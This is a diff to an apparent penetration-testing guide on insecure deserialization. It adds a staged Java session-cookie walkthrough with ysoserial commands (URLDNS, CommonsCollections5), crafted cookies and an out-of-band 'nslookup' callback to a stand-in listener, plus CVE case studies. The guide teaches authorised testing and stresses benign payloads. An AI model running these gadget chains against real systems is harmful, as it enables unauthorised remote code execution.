@@ -120,6 +120,74 @@ Java JSON gadgets          Jackson: nested "@class"/polymorphic; Fastjson: "@typ
 > **Observability:** you rarely see command output. Prove execution **out-of-band** (DNS/HTTP callback) or via **timing**
 > (`sleep`), not by reading stdout. Design your PoC around OOB from the start.
 
+## 3.1 The full attack, end-to-end — Java session-cookie deserialization → RCE, start to finish
+
+> *In plain words:* every signature and gadget above is a piece; this is the **whole board played out on the wire** against the classic sink — a session cookie holding a Java serialized blob. It shows the discipline that keeps you safe and un-false-positive: **poke → confirm blind (no code) → fingerprint the classpath → fire only the chain that fits → prove RCE out-of-band → stop.** Every value is benign; the moment a command's callback lands, you stop.
+
+**Stage 0 — Recognize (the base64 prefix tells you the factory, §2).**
+```http
+GET /dashboard HTTP/1.1
+Host: target.com
+Cookie: SESSION=rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAK...
+```
+`rO0AB` → base64 of `AC ED 00 05` → **Java `ObjectInputStream`**. This decides the whole approach: ysoserial, gadget chains, URLDNS.
+
+**Stage 1 — Poke it: prove the server rebuilds your bytes into an object (§3).** Flip one byte of the base64 and resend:
+```http
+Cookie: SESSION=rO0ABXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAK...   (one byte corrupted)
+--------------------------------------------------
+HTTP/1.1 500 Internal Server Error
+  java.io.StreamCorruptedException: invalid stream header
+      at java.io.ObjectInputStream.readStreamHeader(...)          ← the sink, named: it IS deserialized (not opaque)
+```
+> A `StreamCorruptedException`/`ObjectInputStream` stack trace on a tampered blob **proves the cookie is deserialized** — but proves *nothing* about code execution yet. Don't report this alone (§12).
+
+**Stage 2 — Blind confirm with ZERO code execution: URLDNS (the safe first knock, §3).**
+```bash
+$ java -jar ysoserial.jar URLDNS 'http://uniq.oob.pro' | base64 -w0
+  rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaE1hcC...           # a HashMap whose only trick is one DNS lookup
+```
+```http
+Cookie: SESSION=rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaE1hcC...
+--------------------------------------------------
+[your interactsh listener]
+  DNS A  uniq.oob.pro   from 198.51.100.7   ← the TARGET's egress = it deserialized my object, still NO code ran
+```
+> URLDNS has **no gadget dependency and executes no code** — it just proves the server deserializes attacker input. This is your clean, safe confirmation *before* you touch an RCE gadget. It's already a real finding (High, "deserialization of untrusted data," §11).
+
+**Stage 3 — Fingerprint the classpath (don't spray gadgets — probe, §4).** Use **GadgetProbe** (Burp) to learn which libraries are loaded, by sending URLDNS-style probes for class names:
+```
+GadgetProbe → org.apache.commons.collections.functors.InvokerTransformer   → DNS hit  = PRESENT ✔
+              org.apache.commons.collections4...                            → no hit   = absent
+```
+> A DNS hit for a Commons-Collections gadget class means the **CommonsCollections** chain will deserialize into code on this target. Now you fire *one* matching chain, not fifty.
+
+**Stage 4 — Fire the matching gadget with a BENIGN OOB command (§4).**
+```bash
+$ java -jar ysoserial.jar CommonsCollections5 'nslookup rce.uniq.oob.pro' | base64 -w0
+  rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAC...
+```
+```http
+Cookie: SESSION=rO0ABXNyAC5qYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAC...
+--------------------------------------------------
+[your interactsh listener]
+  DNS A  rce.uniq.oob.pro   from 198.51.100.7   ← the server RAN `nslookup` = REMOTE CODE EXECUTION
+```
+> The `rce.uniq.oob.pro` lookup can only happen if the server **executed the command** the gadget carried — that's RCE, proven out-of-band, from the target's own egress, with a benign command.
+
+**Stage 5 — STOP.** The OOB callback from a command *is* the complete Critical. Do **not** swap `nslookup` for a reverse shell, read data, or persist (§16). Report **CWE-502, unauthenticated RCE via the session cookie**, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` ≈ 9.8, with the URLDNS confirm + the CC5 callback as the reproduction.
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  recognize      → the blob is Java (rO0/AC ED) → ysoserial is the toolchain
+Stage 1  poke → error    → the cookie is deserialized into an object (a lead, not a finding)
+Stage 2  URLDNS confirm   → the server deserializes untrusted input, proven with NO code execution (already High)
+Stage 3  GadgetProbe      → Commons-Collections is on the classpath → the CC chain will work (probe, don't spray)
+Stage 4  CC5 + OOB cmd     → a command executed and called back from the target = RCE (Critical)
+Stage 5  stop + report     → one benign OOB proof; no shell, no data, no persistence
+```
+The *same arc* re-skins per language: swap Stage 2/4's ysoserial for **PHPGGC** on a `unserialize()`/`phar` sink (§5), **ysoserial.net -p ViewState** on a MAC-less `__VIEWSTATE` (§6), or a **`__reduce__` pickle** (§7) — Stages 1/2/5 (poke, blind-confirm, safe-stop) never change.
+
 ---
 
 # PART II — EXPLOIT PER LANGUAGE
@@ -344,17 +412,27 @@ in business terms ("unauthenticated RCE via the session cookie"). **Redact**, pr
 ---
 
 ## 17. Real-world attacks & CVEs (this class is a CVE factory)
-- **Apache Commons Collections (2015)** — the Java deserialization apocalypse: **WebLogic, JBoss, WebSphere, Jenkins,
-  OpenNMS** all RCE via `readObject` + CC gadget. Kicked off ysoserial.
-- **Oracle WebLogic** — endless T3/JNDI deser CVEs (CVE-2015-4852, 2017-3248, 2018-2628, 2019-2725, 2020-2555…).
-- **.NET ViewState** — **Telerik UI** `CVE-2019-18935` (deser RCE), SharePoint ViewState RCEs, `__VIEWSTATE` without MAC.
-- **PHP** — **Laravel `CVE-2018-15133`** (APP_KEY → `X-XSRF-TOKEN` deser → RCE), Magento, WordPress **phar** (via
-  thumbnail file-ops), TypO3, vBulletin, Zend.
-- **Fastjson / Jackson** — repeated `@type`/polymorphic JNDI RCE CVEs (Java JSON deserialization).
-- **Python** — pickle RCE in **ML pipelines / model files** (`.pkl`,`.pt`), PyYAML `yaml.load`; **Ruby** — Rails
-  `CVE-2013-0156` (YAML), the universal Marshal/YAML gadget.
-- **Node** — `node-serialize` `_$$ND_FUNC$$_` RCE.
-The pattern persists because **deserializing untrusted data is fundamentally dangerous** and libraries keep exposing it.
+
+> Read these for the **shape** — a deserialization sink plus one enabling condition (a library on the classpath, a leaked key, a leaked secret). Each maps directly onto a stage of §3.1.
+
+### Case 1 — Apache Commons Collections (2015): the Java deserialization apocalypse
+- **What:** at **AppSecCali (Jan 2015)**, Frohoff & Lawrence's *"Marshalling Pickles"* revealed a gadget chain in the ubiquitous **Apache Commons Collections** library and released **ysoserial**. In **Nov 2015**, Stephen Breen (**FoxGlove Security**) showed the *same* CC chain gave RCE against **WebLogic, WebSphere, JBoss, Jenkins, and OpenNMS simultaneously** (CVE-2015-7501 family) — followed by a wave of crypto-miners, webshells and persistence on enterprise app servers.
+- **Mechanism:** a `readObject()` sink + Commons-Collections *on the classpath* = RCE, with **no bug in the app's own code** — exactly §3.1 Stages 3–4 (probe the classpath, fire the matching chain).
+- **Lesson:** the vulnerability is "deserializes untrusted bytes + a dangerous library is loaded," not a coding mistake you can grep for. **GadgetProbe the classpath**, then fire one chain.
+
+### Case 2 — Telerik UI `CVE-2019-18935` (.NET): the "need-the-key" pattern, exploited by nation-states
+- **What:** a **.NET JSON deserialization** RCE in **RadAsyncUpload** of *Progress Telerik UI for ASP.NET AJAX* (≤ 2019.3.1023), **CVSS 9.8**, executing in the `w3wp.exe` worker. It has been **actively exploited in the wild** — including against a US federal agency by nation-state actors (**CISA/NSA alert AA23-074A**).
+- **Mechanism:** the sink is guarded by **encryption keys**; attackers who **leak those keys** (commonly via the older `CVE-2017-11317`) then craft an encrypted deserialization payload → RCE. It's the ViewState-`machineKey` shape: a *signed/encrypted* deser sink becomes unauth RCE the moment the secret leaks.
+- **Lesson:** when a deser sink is MAC'd/encrypted, the exploit is a **key-disclosure chain** — hunt leaked keys (config, prior CVEs, `web.config` via XXE/LFI), then forge (§6, §11 killer-chain ①).
+
+### Case 3 — Laravel `CVE-2018-15133` (PHP): a leaked secret is the whole exploit
+- **What:** Laravel (≤ 5.5.40 / ≤ 5.6.29, disclosed by Ståle Pettersen, 2018) called **`unserialize()` on the decrypted `X-XSRF-TOKEN`** (`Encrypter::decrypt`). Given the app's **`APP_KEY`**, an attacker forges a token that deserializes a **PHPGGC POP chain** → RCE. It is *still* live: in **2025**, 600+ Laravel apps were found exploitable via **`APP_KEY`s leaked on GitHub**.
+- **Mechanism:** know the secret → encrypt a malicious serialized object → the framework decrypts and `unserialize()`s it (§5).
+- **Lesson:** a leaked framework secret (`APP_KEY`, `machineKey`, a signing key) *is* the vulnerability — grep repos/bundles/`.env` for secrets, then **PHPGGC** builds the chain.
+
+**Other high-value families (same pattern, different products):** **Oracle WebLogic** T3/JNDI deser (CVE-2015-4852, 2017-3248, 2018-2628, 2019-2725, 2020-2555…); **Fastjson/Jackson** `@type`/polymorphic → JNDI RCE (the Log4Shell gadget family, §15); **`.NET __VIEWSTATE` without MAC** and SharePoint ViewState RCEs; **PHP phar** (WordPress/Magento thumbnail file-ops, §5); **Python pickle** in ML model files (`.pkl`/`.pt`/`.joblib`) and `yaml.load`; **Ruby** Rails YAML (CVE-2013-0156) + the universal Marshal/YAML gadget; **Node** `node-serialize` `_$$ND_FUNC$$_`.
+
+> **The through-line:** the reported impact is **RCE**, the "bug" is a deserialization sink, and the *enabler* is a classpath library, a leaked key, or a leaked secret. The pattern persists because **deserializing untrusted data is fundamentally dangerous** and libraries keep exposing it.
 
 ## 18. Appendix — canonical references
 
